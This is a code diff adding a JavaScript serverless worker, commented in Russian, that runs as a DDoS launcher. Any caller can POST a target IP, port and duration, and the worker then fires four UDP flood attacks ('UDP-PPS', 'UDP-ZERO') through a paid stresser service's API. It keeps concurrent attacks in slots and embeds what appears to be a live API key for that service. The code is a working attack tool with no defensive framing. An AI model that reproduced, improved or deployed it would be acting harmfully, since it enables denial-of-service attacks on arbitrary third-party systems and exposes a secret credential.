@@ -1,0 +1,296 @@
+// ============================================================================
+//                    НАСТРОЙКИ АТАК - РЕДАКТИРУЙ ЗДЕСЬ!
+// ============================================================================
+
+const RETROSTRESS_API_URL = "https://retrostress.net/api/v1/tests";
+const RETROSTRESS_API_KEY = "545dc2907e14a4a5aa893a909e178732bbec33849eaf7769811bf4a9ae74fb9e";
+
+// КОНФИГУРАЦИЯ АТАК
+const ATTACK_CONFIG = [
+  { method: "UDP-PPS", concurrent: 4 },
+  { method: "UDP-PPS", concurrent: 4 },
+  { method: "UDP-ZERO", concurrent: 4 },
+  { method: "UDP-ZERO", concurrent: 4 },
+];
+
+const DELAY_BETWEEN_ATTACKS = 100;
+
+// Максимальное количество слотов
+const MAX_SLOTS = 4;
+
+// Время жизни слота (секунды) - должно быть >= максимальной длительности атаки
+const SLOT_TTL = 120; // 2 минуты
+
+// ============================================================================
+//                         SLOT MANAGEMENT
+// ============================================================================
+
+async function getAvailableSlots() {
+  try {
+    const now = Date.now();
+    const slots = [];
+    
+    // Читаем все 4 слота из KV
+    for (let i = 1; i <= MAX_SLOTS; i++) {
+      const slotKey = `slot_${i}`;
+      const slotData = await SLOT_KV.get(slotKey);
+      
+      if (slotData) {
+        const slot = JSON.parse(slotData);
+        // Проверяем не истёк ли слот
+        if (slot.expiresAt > now) {
+          slots.push(i);
+        }
+      }
+    }
+    
+    return MAX_SLOTS - slots.length; // Количество свободных слотов
+  } catch (error) {
+    console.error('Error getting slots:', error);
+    return MAX_SLOTS; // В случае ошибки разрешаем атаку
+  }
+}
+
+async function occupySlot(duration) {
+  try {
+    const now = Date.now();
+    const expiresAt = now + (duration * 1000) + 5000; // +5 секунд запас
+    
+    // Ищем свободный слот
+    for (let i = 1; i <= MAX_SLOTS; i++) {
+      const slotKey = `slot_${i}`;
+      const slotData = await SLOT_KV.get(slotKey);
+      
+      if (!slotData) {
+        // Слот свободен
+        await SLOT_KV.put(slotKey, JSON.stringify({
+          occupiedAt: now,
+          expiresAt: expiresAt,
+          duration: duration
+        }), { expirationTtl: SLOT_TTL });
+        
+        console.log(`   Occupied slot ${i} for ${duration}s`);
+        return i;
+      }
+      
+      const slot = JSON.parse(slotData);
+      if (slot.expiresAt <= now) {
+        // Слот истёк, можем занять
+        await SLOT_KV.put(slotKey, JSON.stringify({
+          occupiedAt: now,
+          expiresAt: expiresAt,
+          duration: duration
+        }), { expirationTtl: SLOT_TTL });
+        
+        console.log(`   Occupied expired slot ${i} for ${duration}s`);
+        return i;
+      }
+    }
+    
+    // Нет свободных слотов
+    return null;
+  } catch (error) {
+    console.error('Error occupying slot:', error);
+    return 1; // В случае ошибки разрешаем атаку
+  }
+}
+
+// ============================================================================
+//                         REQUEST HANDLER
+// ============================================================================
+
+addEventListener('fetch', event => {
+  event.respondWith(handleRequest(event.request));
+});
+
+async function handleRequest(request) {
+  const corsHeaders = {
+    'Access-Control-Allow-Origin': '*',
+    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+    'Access-Control-Allow-Headers': 'Content-Type',
+  };
+
+  if (request.method === 'OPTIONS') {
+    return new Response(null, { headers: corsHeaders });
+  }
+
+  // ✅ ИСПРАВЛЕНИЕ: GET больше не показывает информацию об атаках!
+  if (request.method === 'GET') {
+    // Проверяем свободные слоты
+    const availableSlots = await getAvailableSlots();
+    
+    return new Response(JSON.stringify({
+      status: availableSlots > 0 ? 'available' : 'busy',
+      slots: availableSlots
+    }), {
+      headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+    });
+  }
+
+  if (request.method === 'POST') {
+    try {
+      const body = await request.json();
+      const { ip, port, time } = body;
+      
+      if (!ip || !port || !time) {
+        return new Response(JSON.stringify({
+          status: 'error',
+          message: 'Missing required fields'
+        }), {
+          status: 400,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+        });
+      }
+
+      // ✅ НОВОЕ: Проверяем свободные слоты
+      const availableSlots = await getAvailableSlots();
+      
+      if (availableSlots === 0) {
+        console.log('❌ All slots busy');
+        return new Response(JSON.stringify({
+          status: 'error',
+          message: 'Slots busy',
+          slots: 0
+        }), {
+          status: 503,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+        });
+      }
+
+      console.log(`📥 Received: ${ip}:${port} for ${time}s (${availableSlots} slots available)`);
+      
+      // ✅ НОВОЕ: Занимаем слот
+      const occupiedSlot = await occupySlot(time);
+      
+      if (occupiedSlot === null) {
+        return new Response(JSON.stringify({
+          status: 'error',
+          message: 'Could not occupy slot',
+          slots: 0
+        }), {
+          status: 503,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+        });
+      }
+
+      console.log(`🚀 Launching ${ATTACK_CONFIG.length} attacks (slot ${occupiedSlot})...`);
+
+      // Запускаем атаки
+      const attackPromises = ATTACK_CONFIG.map((config, index) => {
+        return new Promise(resolve => {
+          setTimeout(async () => {
+            const payload = {
+              target: ip,
+              port: parseInt(port),
+              duration: parseInt(time),
+              method: config.method,
+              concurrent: config.concurrent,
+              customId: `Creys-${index + 1}-${Date.now()}`
+            };
+
+            console.log(`   Attack ${index + 1}/${ATTACK_CONFIG.length}: ${config.method}`);
+
+            try {
+              const response = await fetch(RETROSTRESS_API_URL, {
+                method: 'POST',
+                headers: {
+                  'Authorization': `Bearer ${RETROSTRESS_API_KEY}`,
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+              });
+
+              const resultText = await response.text();
+              
+              if (response.ok) {
+                console.log(`   ✅ Attack ${index + 1} launched`);
+                resolve({
+                  success: true,
+                  status: response.status,
+                  method: config.method,
+                  index: index + 1
+                });
+              } else {
+                console.log(`   ❌ Attack ${index + 1} failed: ${response.status}`);
+                resolve({
+                  success: false,
+                  status: response.status,
+                  error: resultText,
+                  method: config.method,
+                  index: index + 1
+                });
+              }
+              
+            } catch (error) {
+              console.log(`   ❌ Attack ${index + 1} error: ${error.message}`);
+              resolve({
+                success: false,
+                error: error.message,
+                method: config.method,
+                index: index + 1
+              });
+            }
+          }, index * DELAY_BETWEEN_ATTACKS);
+        });
+      });
+
+      const results = await Promise.all(attackPromises);
+      const successCount = results.filter(r => r.success).length;
+      const failedCount = results.filter(r => !r.success).length;
+      
+      console.log(`📊 Results: ${successCount} success, ${failedCount} failed`);
+
+      // Если все атаки провалились
+      if (successCount === 0) {
+        const firstError = results.find(r => !r.success);
+        
+        return new Response(JSON.stringify({
+          status: 'error',
+          message: 'All attacks failed',
+          reason: firstError?.error || 'Unknown error'
+        }), {
+          status: 503,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+        });
+      }
+      
+      // Частичный успех
+      if (successCount < ATTACK_CONFIG.length) {
+        return new Response(JSON.stringify({
+          status: 'partial',
+          message: `Launched`,
+          successful: successCount,
+          failed: failedCount
+        }), {
+          status: 200,
+          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+        });
+      }
+
+      // Полный успех
+      return new Response(JSON.stringify({
+        status: 'success',
+        message: 'Launched'
+      }), {
+        status: 200,
+        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+      });
+
+    } catch (error) {
+      console.error('❌ Error:', error);
+      
+      return new Response(JSON.stringify({
+        status: 'error',
+        message: 'Internal error'
+      }), {
+        status: 500,
+        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
+      });
+    }
+  }
+
+  return new Response('Method not allowed', { 
+    status: 405,
+    headers: corsHeaders 
+  });
+}
